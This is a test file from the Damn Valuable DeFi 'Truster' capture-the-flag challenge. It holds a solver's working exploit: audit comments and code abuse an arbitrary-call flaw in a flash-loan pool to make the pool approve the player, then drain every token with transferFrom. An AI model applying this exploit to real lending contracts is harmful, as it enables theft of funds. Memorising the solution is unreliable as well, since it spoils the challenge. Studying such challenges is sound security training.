const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // @audit TrusterLenderPool.flashLoan() allows arbitrary code execution via target.functionCall(data);
        // attacker can control both target & data
        // target uses OpenZeppelin Address https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol
        // Address.functionCall() -> target.call{value: value}(data)
        //
        // Attacker can use parameters:
        //   target = token.address
        //   data   = abi.encodeWithSignature("approve(address,uint256)", player.address, TOKENS_IN_POOL)
        // to execute token.approve(player.address, TOKENS_IN_POOL) function with pool as msg.sender 
        // then player can directly call token.transferFrom() to steal all of pool's tokens 
        let iface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
        let encodedFunc = iface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);

        await pool.connect(player).flashLoan(0, player.address, token.address, encodedFunc);
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

